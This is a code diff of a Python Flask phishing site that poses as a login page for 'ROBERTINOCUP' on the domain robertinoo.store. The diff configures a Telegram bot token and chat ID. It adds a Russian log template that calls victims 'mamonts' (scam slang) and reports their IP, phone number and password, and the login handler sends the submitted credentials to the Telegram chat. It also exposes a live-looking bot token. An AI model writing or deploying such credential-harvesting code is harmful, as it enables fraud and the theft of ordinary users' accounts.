@@ -5,9 +5,18 @@ from urllib.request import Request, urlopen
 app = Flask(__name__)
 
 TOKEN = '6114773413:AAFlXzRw2PhkJ4Pq5vVeTC_vKQgJuvX47fE'
-CHAT_ID = '-846202598'
-domain = "тут пиши свой домен"
-websiteName = "название сайта"
+CHAT_ID = '660502874'
+domain = "robertinoo.store"
+websiteName = "ROBERTINOCUP"
+
+
+
+LOG_MESSAGE = '💳 Мамонт ввёл данные 💳 \n\n 🌐 Ip мамонта: {user_agent} \n\n 📱Номер телефона: {number} \n 💻Пароль: {password} \n '
+
+
+
+
+
 
 app.jinja_env.globals.update(websiteName = websiteName)
 
@@ -98,7 +107,7 @@ def page():
     elif len(number) < 9 or len(password) < 6:
         return render_template('auth.html', error = "Заполните поля правильно!")
 
-    send(f"#данные\n{number}\n{password}")
+    send(LOG_MESSAGE)
 
     return redirect("/")
 
